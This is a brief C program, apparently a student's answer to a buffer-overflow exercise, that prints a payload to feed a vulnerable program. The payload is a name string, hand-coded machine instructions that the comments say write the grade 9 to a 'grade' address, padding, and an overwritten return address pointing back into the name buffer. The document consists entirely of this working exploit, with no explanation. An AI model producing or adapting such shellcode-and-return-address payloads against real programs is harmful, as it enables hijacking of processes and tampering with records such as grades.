#include <stdio.h>

int main(){
int i;
putchar('A');
putchar('t');
putchar('h');
putchar('e');
putchar('n');
putchar('a');
putchar('\0');
putchar(0x00);
putchar(0xc6); /*mov 9(x39) to grade , in the right address*/
putchar(0x68); /*grade address*/
putchar(0x8b);
putchar(0x46);
putchar(0x04);
putchar(0x08);
putchar(0x39); /*ascii code for 9*/
putchar(0xb8);



putchar(0x6f);/*mov 9 to eax*/
putchar(0x8b);
putchar(0x04);
putchar(0x08);

putchar(0xff);
putchar(0xe0);


for(i=0; i<26; i++){ /*skoupidia ws ret. address*/
putchar('\0');
}

putchar(0x38); /*return address*/


/*gia name+8*/
 putchar(0xe8);
 putchar(0x65);
 putchar(0x0d);
 putchar(0x08);
/*gia name*/
 putchar(0xe0);
 putchar(0x65);
 putchar(0x0d);
 putchar(0x08);

putchar('\n');
return 0;

}
